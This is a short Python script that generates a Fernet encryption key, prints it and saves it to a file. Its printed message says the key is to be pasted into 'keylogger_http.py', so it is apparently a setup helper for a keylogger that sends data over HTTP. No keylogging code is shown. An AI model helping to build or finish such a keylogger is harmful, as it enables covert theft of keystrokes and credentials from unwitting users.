from cryptography.fernet import Fernet

# === Generate AES Key ===
key = Fernet.generate_key()

# === Display Key ===
print("✅ Your AES Encryption Key (copy this and paste in keylogger_http.py):")
print(key.decode())

# Optional: Save to file
with open("encryption_key.txt", "wb") as f:
    f.write(key)

print("✅ Key also saved to 'encryption_key.txt'")
